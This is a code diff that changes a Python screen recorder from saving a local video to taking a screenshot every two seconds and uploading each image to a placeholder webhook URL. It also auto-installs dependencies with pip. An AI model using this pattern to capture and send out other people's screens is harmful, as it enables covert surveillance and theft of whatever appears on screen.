@@ -1,35 +1,46 @@
 import subprocess
 import sys
+import time
+import io
+import pyautogui
+import numpy as np
+import requests
+from PIL import Image
 
 def install_packages():
     """Install required packages."""
     requirements = [
         'pyautogui',
-        'opencv-python',
-        'numpy'
+        'requests',
+        'numpy',
+        'Pillow'
     ]
     for package in requirements:
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
 
+def send_image_to_webhook(image_bytes):
+    """Send the image to a webhook."""
+    webhook_url = 'YOUR_WEBHOOK_URL'
+    files = {'file': ('screenshot.png', image_bytes, 'image/png')}
+    response = requests.post(webhook_url, files=files)
+    if response.status_code == 200:
+        print("Image successfully sent to webhook.")
+    else:
+        print(f"Failed to send image to webhook. Status code: {response.status_code}")
+
 def main():
     try:
         import pyautogui
-        import cv2
+        import requests
         import numpy as np
+        from PIL import Image
     except ImportError:
         print("Required packages are not installed. Installing...")
         install_packages()
         import pyautogui
-        import cv2
+        import requests
         import numpy as np
-
-    # Define the screen size
-    screen_size = pyautogui.size()
-    width, height = screen_size.width, screen_size.height
-
-    # Define the codec and create a VideoWriter object
-    fourcc = cv2.VideoWriter_fourcc(*'XVID')
-    out = cv2.VideoWriter('screen_record.avi', fourcc, 20.0, (width, height))
+        from PIL import Image
 
     print("Recording... Press Ctrl+C to stop.")
 
@@ -38,18 +49,18 @@ def main():
             # Take a screenshot
             img = pyautogui.screenshot()
 
-            # Convert the image to a format suitable for OpenCV
-            frame = np.array(img)
-            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            # Convert the image to a bytes object
+            with io.BytesIO() as buffer:
+                img.save(buffer, format="PNG")
+                image_bytes = buffer.getvalue()
 
-            # Write the frame to the video file
-            out.write(frame)
+            # Send the image to the webhook
+            send_image_to_webhook(image_bytes)
+
+            # Wait for 2 seconds before taking the next screenshot
+            time.sleep(2)
     except KeyboardInterrupt:
         print("Recording stopped.")
-
-    # Release everything when the recording is done
-    out.release()
-    cv2.destroyAllWindows()
 
 if __name__ == "__main__":
     main()
